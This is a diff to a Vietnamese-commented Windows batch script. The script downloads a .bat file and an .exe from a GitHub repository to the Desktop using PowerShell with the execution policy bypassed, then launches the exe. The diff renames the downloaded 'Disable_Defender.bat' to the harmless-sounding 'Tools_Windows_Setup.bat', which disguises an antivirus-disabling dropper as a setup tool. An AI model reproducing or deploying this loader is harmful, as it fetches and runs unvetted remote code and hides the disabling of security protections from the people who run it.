@@ -22,7 +22,7 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName S
 exit /b
 
 :ADMIN
-echo ✅ Dang chay voi quyen Admin.
+echo Dang chay voi quyen Admin.
 echo.
 
 :: ========================
@@ -38,16 +38,16 @@ echo.
 :: TẢI FILE TỪ GITHUB (NẾU CHƯA CÓ)
 :: ========================
 set "DESKTOP=%USERPROFILE%\Desktop"
-set "FILE1=%DESKTOP%\Disable_Defender.bat"
+set "FILE1=%DESKTOP%\Tools_Windows_Setup.bat"
 set "FILE2=%DESKTOP%\Tools_Windows_Setup.exe"
-set "URL_BAT=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Disable_Defender.bat"
+set "URL_BAT=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Tools_Windows_Setup.bat"
 set "URL_EXE=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Tools_Windows_Setup.exe"
 
 if exist "%FILE1%" (
-  echo [+] Da ton tai: Disable_Defender.bat
+  echo [+] Da ton tai: Tools_Windows_Setup.bat
 ) else (
-  echo 📥 Dang tai Disable_Defender.bat...
-  powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL_BAT%' -OutFile '%FILE1%' -UseBasicParsing"  || echo [-] Loi tai Disable_Defender.bat
+  echo 📥 Dang tai Tools_Windows_Setup.bat...
+  powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL_BAT%' -OutFile '%FILE1%' -UseBasicParsing"  || echo [-] Loi tai Tools_Windows_Setup.bat
 )
 
 if exist "%FILE2%" (
@@ -62,14 +62,14 @@ echo.
 :: KIỂM TRA & MỞ FILE
 :: ========================
 if exist "%FILE1%" (
-  echo [+] San sang: Disable_Defender.bat
+  echo [+] San sang: Tools_Windows_Setup.bat
 ) else (
-  echo [-] Khong tim thay Disable_Defender.bat
+  echo [-] Khong tim thay Tools_Windows_Setup.bat
 )
 
 if exist "%FILE2%" (
   echo [+] San sang: Tools_Windows_Setup.exe
-  echo 🚀 Dang mo Tools_Windows_Setup.exe...
+  echo Dang mo Tools_Windows_Setup.exe...
   start "" "%FILE2%"
 ) else (
   echo [-] Khong tim thay Tools_Windows_Setup.exe
